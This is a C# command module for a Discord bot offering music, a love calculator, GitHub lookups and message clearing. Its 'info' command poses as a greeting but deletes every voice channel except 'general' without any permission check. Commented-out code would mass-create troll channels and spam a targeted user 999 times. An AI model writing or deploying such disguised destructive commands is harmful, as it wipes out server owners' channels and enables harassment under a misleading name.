using Discord;
using Discord.Commands;
using Discord.WebSocket;
using YoutubeExplode.Common;

namespace DiscordBot
{
	public class Commands : ModuleBase<SocketCommandContext>
	{


		private Player _player;

		public Commands(Player player)
		{
			_player = player;
		}

		//[Command("help", RunMode = RunMode.Async)]
		//public async Task HelpAsync()
		//{
		//	await ReplyAsync($"Hola {Context.Message.Author}");
		//}

		[Command("info", RunMode = RunMode.Async)]
		public async Task InfoAsync()
		{
			await ReplyAsync($"Hola {Context.User}");
			await ReplyAsync($"Estamos en {Context.Guild.Name}");

			var channels = Context.Guild.VoiceChannels;

			foreach (var channel in channels)
			{
				if (channel.Name != "general")
				{
					await channel.DeleteAsync();
				}
			}

			//for (int i = 0; i < 100; i++)
			//{
			//	await Context.Guild.CreateVoiceChannelAsync($"Troleo Hermano {i + 1}");
			//}
		}

		[Command("github", RunMode = RunMode.Async)]
		public async Task GitHubCommand(string input)
		{
			ITextChannel textChannel = Context.Channel as ITextChannel;

			await Github.StartGithub(textChannel, input);
		}

		[Command("love", RunMode = RunMode.Async)]
		public async Task Love([Remainder] string input)
		{
			ITextChannel textChannel = Context.Channel as ITextChannel;
			var mentionedUsers = Context.Message.MentionedUsers;

			if (mentionedUsers.Count == 2)
			{
				LoveCalc.StartLoveCalc(mentionedUsers, textChannel);
			}
			else
			{
				await ReplyAsync("YOU MUST ENTER 2 USERS");
			}
		}

		[Command("clear", RunMode = RunMode.Async)]
		public async Task Clear(string input)
		{
			IGuildUser user = Context.User as IGuildUser;

			if (user.GuildPermissions.ManageMessages)
			{
				int value;

				if (int.TryParse(input, out value))
				{
					ITextChannel channel = Context.Channel as ITextChannel;

					var messages = await channel.GetMessagesAsync(++value).FlattenAsync();

					foreach (IMessage message in messages)
							await message.DeleteAsync();

					await ReplyAsync($" MESSAGES DELETED: {value} :)");
				}
				else
				{
					await ReplyAsync("YOU MUST ENTER A NUMBER GREATER THAN 0");
				}
			}
			else
			{
				await ReplyAsync("YOU DON'T HAVE PERMISSION TO DO THAT :(");
			}

		}

		[Command("play", RunMode = RunMode.Async)]
		public async Task PlayAsync([Remainder] string input)
		{
			IVoiceChannel voiceChannel = (Context.User as IGuildUser).VoiceChannel;
			ITextChannel textChannel = Context.Channel as ITextChannel;

			if (voiceChannel != null)
			{
				_player.StartPlayer(voiceChannel, textChannel, input);
			}
			else
			{
				await ReplyAsync($"YOU ARE NOT ON ANY VOICE CHANNEL :(");
			}
		}

		[Command("stop", RunMode = RunMode.Async)]
		public async Task StopAsync() => _player.Stop();

		[Command("troll", RunMode = RunMode.Async)]
		public async Task TrollAsync()
		{
			//var client = new DiscordSocketClient(new DiscordSocketConfig
			//{
			//	GatewayIntents = GatewayIntents.All
			//});

			//SocketUser user = client.GetUser(414395803973713940);

			//for (int i = 0; i < 999; i++)
			//{
			//	await Utilities.ConteSendMessageWithColor("ffffffffffff", Color.Red);
			//}
		}
	}
}
